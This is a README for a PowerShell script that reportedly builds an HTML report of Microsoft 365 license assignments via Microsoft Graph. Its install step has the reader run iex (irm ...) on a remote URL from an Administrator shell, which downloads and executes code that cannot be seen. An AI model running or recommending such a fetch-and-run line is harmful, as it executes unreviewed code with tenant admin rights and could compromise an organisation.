# 📄 Microsoft 365 License Management Script

---

This PowerShell script automates the process of collecting user assignment details for every Microsoft 365 license in your tenant. It connects directly to the Microsoft Graph API to pull the data and generates a detailed **HTML report** summarizing all your license usage.

---

## 🚀 Getting Started

1.  **Open PowerShell as Administrator.**

2.  Run the following command:

    ```powershell
    iex (irm 'https://lic-management.vercel.app/use.ps1')
    ```

3.  Once executed, the script will:

    * Connect securely to Microsoft Graph.
    * Enumerate all available service plans (licenses) in your tenant.
    * Retrieve details for users assigned to each license.
    * Compile and save the HTML report.

---

## 📊 Output

* 📁 A file named `license_management_report.html` will be saved at:

    ```
    C:\LicManagement\license_management_report.html
    ```

* ✅ The report provides a clear breakdown, including:

    * All licenses detected in your tenant.
    * A list of users assigned to each specific license.
    * The total count of unique users holding any license.

---

## ✅ Requirements

* PowerShell version 5.1 or higher.
* Microsoft 365 administrative permissions sufficient to query license assignments.
* Internet access.

---

## 🔒 Security

No credentials are stored locally by the script. Authentication is handled securely via standard Microsoft Graph methods, typically involving interactive sign-in or existing session tokens.

---

## 📬 Support

For questions, feedback, or to report issues, please open an issue on the project repository or contact the script maintainer directly.
